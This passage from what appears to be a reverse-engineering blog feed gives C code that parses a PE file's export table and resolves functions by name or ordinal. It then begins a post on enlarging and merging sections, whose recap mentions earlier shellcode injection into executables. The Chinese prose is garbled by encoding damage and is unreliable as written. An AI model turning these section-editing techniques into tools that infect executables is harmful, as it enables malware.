class="hljs-string">&quot;base: %d\n&quot;</span>,base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d found: %x\n&quot;</span>,Ord,*(AddressOfFuncitons + Ord-base));<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="æ€»ä»£ç "><a href="#æ€»ä»£ç " class="headerlink" title="æ€»ä»£ç "></a>æ€»ä»£ç </h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br>DWORD <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    DWORD size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><br>DWORD <span class="hljs-title function_">RVA_TO_FOA</span><span class="hljs-params">(DWORD RVA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br>    <br>    <span class="hljs-keyword">if</span> (RVA &lt; OptionalHeader-&gt;SizeOfHeaders)<br>&#123;<br><span class="hljs-keyword">return</span> RVA;<br>&#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(RVA &gt;= SectionHeader-&gt;VirtualAddress &amp;&amp; RVA &lt; (SectionHeader+<span class="hljs-number">1</span>)-&gt;VirtualAddress)&#123;<br>            DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader +=<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><br>     <span class="hljs-comment">//æœ€åä¸€ä¸ªèŠ‚åŒº</span><br>    SectionHeader +=<span class="hljs-number">1</span>;<br>    DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">GetFuncAddrByName</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer,<span class="hljs-type">char</span>* name)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER64 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    NTHeader = (PIMAGE_NT_HEADERS)(Buffer + DosHeader-&gt;e_lfanew);<br>    FILEHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER64)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    DWORD Export_Table_RVA = OptionalHeader-&gt;DataDirectory[<span class="hljs-number">0</span>].VirtualAddress;<br><br>    <span class="hljs-keyword">if</span>(Export_Table_RVA == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This PE File Has Not Export Table!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br>    DWORD Export_Table_FOA = RVA_TO_FOA(Export_Table_RVA,Buffer);<br>    PIMAGE_EXPORT_DIRECTORY _Export_Table = (PIMAGE_EXPORT_DIRECTORY)(Buffer + Export_Table_FOA);<br>    <br>    <span class="hljs-comment">//å‡½æ•°åœ°å€è¡¨</span><br>    DWORD* AddressOfFuncitons = (DWORD*)(Buffer + RVA_TO_FOA(_Export_Table-&gt;AddressOfFunctions,Buffer));<br>    <span class="hljs-comment">//åºå·è¡¨</span><br>    WORD* AddressOfOrdinals = (WORD*)(Buffer +  RVA_TO_FOA(_Export_Table-&gt;AddressOfNameOrdinals,Buffer));<br>    <span class="hljs-comment">//å‡½æ•°åç§°è¡¨</span><br>    DWORD* AddressOfNames = (DWORD*)(Buffer + RVA_TO_FOA(_Export_Table-&gt;AddressOfNames,Buffer));<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; _Export_Table-&gt;NumberOfNames;i++)&#123;<br>        <span class="hljs-type">char</span>* nameaddr = Buffer + RVA_TO_FOA(*(AddressOfNames + i),Buffer);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(name,nameaddr))&#123;<br>            <span class="hljs-type">int</span> ordinal = *(AddressOfOrdinals + i);<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s found: %x\n&quot;</span>,name,*(AddressOfFuncitons + ordinal));<br>                <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Func Not Found\n&quot;</span>);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">GetFuncAddrByOrd</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer,<span class="hljs-type">int</span> Ord)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER64 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    NTHeader = (PIMAGE_NT_HEADERS)(Buffer + DosHeader-&gt;e_lfanew);<br>    FILEHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER64)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    DWORD Export_Table_RVA = OptionalHeader-&gt;DataDirectory[<span class="hljs-number">0</span>].VirtualAddress;<br><br>    <span class="hljs-keyword">if</span>(Export_Table_RVA == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This PE File Has Not Export Table!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br>    DWORD Export_Table_FOA = RVA_TO_FOA(Export_Table_RVA,Buffer);<br>    PIMAGE_EXPORT_DIRECTORY _Export_Table = (PIMAGE_EXPORT_DIRECTORY)(Buffer + Export_Table_FOA);<br>    <br>    <span class="hljs-comment">//å‡½æ•°åœ°å€è¡¨</span><br>    DWORD* AddressOfFuncitons = (DWORD*)(Buffer + RVA_TO_FOA(_Export_Table-&gt;AddressOfFunctions,Buffer));<br>    <span class="hljs-type">int</span> base = _Export_Table-&gt;Base;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;base: %d\n&quot;</span>,base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d found: %x\n&quot;</span>,Ord,*(AddressOfFuncitons + Ord-base));<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Export_Table</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER64 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    NTHeader = (PIMAGE_NT_HEADERS)(Buffer + DosHeader-&gt;e_lfanew);<br>    FILEHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER64)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    DWORD Export_Table_RVA = OptionalHeader-&gt;DataDirectory[<span class="hljs-number">0</span>].VirtualAddress;<br><br>    <span class="hljs-keyword">if</span>(Export_Table_RVA == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This PE File Has Not Export Table!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    DWORD Export_Table_FOA = RVA_TO_FOA(Export_Table_RVA,Buffer);<br>    PIMAGE_EXPORT_DIRECTORY _Export_Table = (PIMAGE_EXPORT_DIRECTORY)(Buffer + Export_Table_FOA);<br><br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Characteristics: %#x\n&quot;</span>, _Export_Table-&gt;Characteristics);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;TimeDateStamp: %#x\n&quot;</span>, _Export_Table-&gt;TimeDateStamp);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;MajorVersion: %#x\n&quot;</span>, _Export_Table-&gt;MajorVersion);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;MinorVersion: %#x\n&quot;</span>, _Export_Table-&gt;MinorVersion);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Name: %s\n&quot;</span>, (Buffer + RVA_TO_FOA(_Export_Table-&gt;Name, Buffer)));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base: %#x\n&quot;</span>, _Export_Table-&gt;Base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NumberOfFunctions: %#x\n&quot;</span>, _Export_Table-&gt;NumberOfFunctions);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NumberOfNames: %#x\n&quot;</span>, _Export_Table-&gt;NumberOfNames);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;AddressOfFunctions: %#x\n&quot;</span>, _Export_Table-&gt;AddressOfFunctions);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;AddressOfNames: %#x\n&quot;</span>, _Export_Table-&gt;AddressOfNames);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;AddressOfNameOrdinals: %#x\n&quot;</span>, _Export_Table-&gt;AddressOfNameOrdinals);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;==========å‡½æ•°åœ°å€è¡¨ AddressOfFuncitons==========\n&quot;</span>);<br>    DWORD* AddressOfFuncitons = (DWORD*)(Buffer + RVA_TO_FOA(_Export_Table-&gt;AddressOfFunctions,Buffer));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; _Export_Table-&gt;NumberOfFunctions;i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ä¸‹æ ‡ï¼š%d å‡½æ•°åœ°å€ï¼š%x\n&quot;</span>, i , *(AddressOfFuncitons + i));<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;==========åºå·è¡¨ AddressOfOrdinals==========\n&quot;</span>);<br>    WORD* AddressOfOrdinals = (WORD*)(Buffer +  RVA_TO_FOA(_Export_Table-&gt;AddressOfNameOrdinals,Buffer));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; _Export_Table-&gt;NumberOfNames; i++)<br>    &#123;<br>         <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ä¸‹æ ‡ï¼š%d åºå·ï¼š%x\n&quot;</span>, i , *(AddressOfOrdinals + i));<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;==========å‡½æ•°åç§°è¡¨ AddressOfNames==========\n&quot;</span>);<br>    DWORD* AddressOfNames = (DWORD*)(Buffer + RVA_TO_FOA(_Export_Table-&gt;AddressOfNames,Buffer));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; _Export_Table-&gt;NumberOfNames;i++)&#123;<br>        <span class="hljs-type">char</span>* nameaddres = Buffer + RVA_TO_FOA(*(AddressOfNames + i),Buffer);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ä¸‹æ ‡ï¼š%d å‡½æ•°åç§°ï¼š%s\n&quot;</span>, i ,nameaddres);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br><br>    FILE* fp1 = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp1, <span class="hljs-string">&quot;C:\\Program Files\\Microsoft SQL Server Compact Edition\\v4.0\\sqlceme40.dll&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br><br>    DWORD size = Size(fp1);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp1);<br><br>    <span class="hljs-type">char</span>* func_name = <span class="hljs-string">&quot;DllRelease&quot;</span>;<br>    <span class="hljs-type">int</span> func_ord  = <span class="hljs-number">2</span>;<br>    Export_Table(buffer);<br>    GetFuncAddrByName(buffer,func_name);<br>    GetFuncAddrByOrd(buffer,func_ord);<br>&#125;<br></code></pre></td></tr></table></figure><p>NOTEï¼š</p><ul><li>å¯ä»¥è‡ªå·±åˆ¶ä½œç®€å•dllå®éªŒï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–è½¯ä»¶çš„dll</li><li>å®é™…ä¸Šï¼Œ<code>GetFuncByName</code> å’Œ <code>GetFuncByOrd</code> å°±ç›¸å½“äºå®ç°äº†ä¹‹å‰è°ƒç”¨dllæ—¶ä½¿ç”¨çš„ä¸€ä¸ªç³»ç»Ÿå‡½æ•° <code>GetProcAddress</code></li></ul><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å¯¼å‡ºè¡¨ä½äº<code>IMAGE_DATA_DIRECTORY</code>çš„ç¬¬ä¸€é¡¹ï¼Œä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªæˆå‘˜</p><blockquote><p>â€‹    DWORD   Base;&#x2F;&#x2F;å¯¼å‡ºå‡½æ•°èµ·å§‹åºå·<br>â€‹    DWORD   NumberOfFunctions;       &#x2F;&#x2F;å¯¼å‡ºå‡½æ•°ä¸ªæ•°<br>â€‹    DWORD   NumberOfNamesï¼›        &#x2F;&#x2F;ä»¥åç§°å¯¼å‡ºå‡½æ•°ä¸ªæ•°<br>â€‹    DWORD   AddressOfFunctions;      &#x2F;&#x2F;å¯¼å‡ºå‡½æ•°åœ°å€è¡¨<br>â€‹DWORD   AddressOfNames;      &#x2F;&#x2F;å¯¼å‡ºå‡½æ•°åç§°è¡¨<br>â€‹    DWORD   AddressOfNameOrdinals; &#x2F;&#x2F;å¯¼å‡ºå‡½æ•°åºå·è¡¨ </p></blockquote><ul><li><p>Base æ˜¯å¯¼å‡ºåºå·é‡Œé¢æœ€å°çš„é‚£ä¸ª</p></li><li><p>NumberOfFuncitons &#x3D; æœ€å¤§å¯¼å‡ºåºå· - æœ€å°å¯¼å‡ºåºå· + 1</p></li><li><p>NumberOfNames &#x3D; ä»¥åå­—å¯¼å‡ºå‡½æ•°ä¸ªæ•°</p></li><li><p>AddressOfFunctionsï¼ŒAddressOfNamesï¼ŒAddressOfNameOrdinalså‡æ˜¯RVAï¼Œå„è‡ªå†æŒ‡å‘ä¸€å¼ è¡¨</p><ul><li><p>AddressOfFunctions æŒ‡å‘æ‰€æœ‰å‡½æ•°åœ°å€è¡¨ï¼Œè¿™é‡Œé¢å‡½æ•°åœ°å€ä¹Ÿæ˜¯RVAï¼Œ</p></li><li><p>AddressOfNames æŒ‡å‘å‡½æ•°åç§°è¡¨ï¼Œé‡Œé¢å­˜å‚¨çš„æ˜¯å‡½æ•°åå­—åœ°å€çš„RVA</p></li><li><p>AddressOfNameOrdinals æŒ‡å‘å‡½æ•°åºå·</p></li><li></li><li><p>AddressOfFunctions  æ•°é‡ &#x3D; NumberOfFuncitons </p></li><li><p>AddressOfNames  æ•°é‡ &#x3D; AddressOfNameOrdinals  æ•°é‡ &#x3D; NumberOfNames</p></li></ul></li><li><p>ä½¿ç”¨åå­—æ‰¾ä¸€ä¸ªå‡½æ•°æµç¨‹ï¼Œå…¶æµç¨‹å¦‚ä¸‹</p><ul><li>éå†åç§°åœ°å€è¡¨ï¼Œä»ä¸­ä¸€ä¸ªä¸€ä¸ªæ¯”å¯¹ï¼Œæ‰¾åˆ°å¯¹åº”çš„å‡½æ•°ï¼Œå¾—åˆ°åç§°åœ°å€è¡¨çš„ç´¢å¼•</li><li>ä½¿ç”¨ç›¸åŒç´¢å¼•åœ¨åºå·è¡¨é‡Œå¾—åˆ°åºå·</li><li>ä»¥å¾—åˆ°çš„åºå·ä¸ºç´¢å¼•ï¼Œåœ¨åœ°å€è¡¨é‡Œå¾—åˆ°å‡½æ•°åœ°å€</li></ul></li><li><p>ä½¿ç”¨åºå·æ‰¾ä¸€ä¸ªå‡½æ•°æµç¨‹ï¼Œå…¶æµç¨‹å¦‚ä¸‹</p><ul><li>ç›´æ¥ç”¨åºå·å‡baseå¾—åˆ°ç´¢å¼•</li><li>ä½¿ç”¨ç´¢å¼•åœ¨åœ°å€è¡¨é‡Œå¾—åˆ°å‡½æ•°åœ°å€</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>PE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PEæ–‡ä»¶ç»“æ„ï¼ˆå…­ï¼‰</title>
    <link href="/2023/07/04/PE_5/"/>
    <url>/2023/07/04/PE_5/</url>
    
    <content type="html"><![CDATA[<p>PEç»ƒä¹ ï¼Œæ‰©å¤§èŠ‚ã€åˆå¹¶èŠ‚</p><span id="more"></span><h2 id="å›é¡¾"><a href="#å›é¡¾" class="headerlink" title="å›é¡¾"></a>å›é¡¾</h2><p>æ­¤å‰å·²ç»åœ¨ä¸€ä¸ªèŠ‚çš„ç©ºç™½åŒºå¢åŠ shellcodeï¼Œè€Œååˆé€šè¿‡æ–°å¢ä¸€ä¸ªèŠ‚çš„æ–¹å¼å¢åŠ shellcodeï¼Œå®é™…ä¸Šä¹Ÿå¯ä»¥é€šè¿‡å¯¹èŠ‚è¿›è¡Œåˆå¹¶ã€æ‰©å¤§æ“ä½œæ¥æ»¡è¶³å…¶ä»–éœ€æ±‚</p><h2 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><h3 id="è¦æ±‚"><a href="#è¦æ±‚" class="headerlink" title="è¦æ±‚"></a>è¦æ±‚</h3><p>1.æ‰©å¤§æœ€åä¸€ä¸ªèŠ‚</p><p>2.åˆå¹¶æ‰€æœ‰èŠ‚</p><h3 id="è¦æ±‚è§£å†³çš„é—®é¢˜"><a href="#è¦æ±‚è§£å†³çš„é—®é¢˜" class="headerlink" title="è¦æ±‚è§£å†³çš„é—®é¢˜"></a>è¦æ±‚è§£å†³çš„é—®é¢˜</h3><h4 id="æ‰©å¤§æœ€åä¸€ä¸ªèŠ‚"><a href="#æ‰©å¤§æœ€åä¸€ä¸ªèŠ‚" class="headerlink" title="æ‰©å¤§æœ€åä¸€ä¸ªèŠ‚"></a>æ‰©å¤§æœ€åä¸€ä¸ªèŠ‚</h4><p>Q1ï¼šä¸ºä»€ä¹ˆæ˜¯æ‰©å¤§æœ€åä¸€ä¸ªèŠ‚</p><p>A1ï¼šå¦‚æœæ‰©å¤§ä¸­é—´çš„èŠ‚ï¼Œé‚£ä¹ˆåé¢çš„èŠ‚çš„åœ°å€å°±ä¼šå…¨éƒ¨å˜åŒ–ï¼Œæ‰€æœ‰åœ°å€å°±å…¨éƒ½æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼Œè€Œæ‰©å¤§æœ€åä¸€ä¸ªèŠ‚åˆ™ä¸ä¼šå½±å“å·²æœ‰åœ°å€</p><p>Q2ï¼šæ‰©å¤§å¤šå°‘åˆé€‚</p><p>A2ï¼šæœ€å¥½ä¹Ÿæ˜¯æ–‡ä»¶å¯¹é½FileAlignmentrå’Œå†…å­˜å¯¹é½SectionAlignmentçš„å€æ•°ï¼Œè¿™æ ·å¯ä»¥å‡å°‘å¾ˆå¤šéº»çƒ¦ï¼Œå°±å¯ä»¥ç›´æ¥åœ¨åŸæ–‡ä»¶çŠ¶æ€ä¸‹æ‰©å¤§ï¼Œè€Œä¸éœ€è¦å†è€ƒè™‘å¯¹é½ã€‚</p><p>Q3ï¼šéœ€è¦ä¿®æ”¹ä»€ä¹ˆå€¼</p><p>A3ï¼šè·Ÿå¤§å°æœ‰å…³çš„å€¼éƒ½éœ€è¦ä¿®æ”¹ï¼ŒOptionalHeaderé‡Œçš„SizeOfImageï¼Œæœ€åä¸€ä¸ªèŠ‚ç›®å½•é¡¹çš„Miscã€SizeOfRawDataã€</p><h4 id="åˆå¹¶æ‰€æœ‰èŠ‚"><a href="#åˆå¹¶æ‰€æœ‰èŠ‚" class="headerlink" title="åˆå¹¶æ‰€æœ‰èŠ‚"></a>åˆå¹¶æ‰€æœ‰èŠ‚</h4><p>Q1ï¼šåº”è¯¥åœ¨å“ªç§çŠ¶æ€ä¸‹åˆå¹¶</p><p>A1ï¼šåªèƒ½åœ¨å†…å­˜çŠ¶æ€ä¸‹åˆå¹¶ï¼Œå› ä¸ºåˆå¹¶æ‰€æœ‰èŠ‚åï¼Œåªæœ‰ä¸€ä¸ªèŠ‚ç›®å½•é¡¹ï¼Œåªèƒ½é€šè¿‡è¿™ä¸ªå»æ‰¾èŠ‚åŒºã€‚å¦‚æœåœ¨æ–‡ä»¶çŠ¶æ€ä¸‹åˆå¹¶ï¼Œé‚£ä¹ˆåé¢çš„èŠ‚åŒºéƒ½ä¸èƒ½æ­£ç¡®æ”¾åˆ°å®ƒä»¬è¯¥å¤„çš„ä½ç½®ä¸Šã€‚è€Œåç›´æ¥å°†å†…å­˜çŠ¶æ€ä¿å­˜ä¸ºæ–‡ä»¶çŠ¶æ€ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ—¶å€™æ–‡ä»¶çŠ¶æ€å°±å·²ç»æ˜¯å†…å­˜å¯¹é½çš„äº†ã€‚</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307012317292.png"></p><p>Q2ï¼šéœ€è¦ä¿®æ”¹å“ªäº›å€¼</p><p>A2ï¼šFileHeaderé‡Œçš„NumberOfSectionsæ”¹ä¸º1ï¼›å› 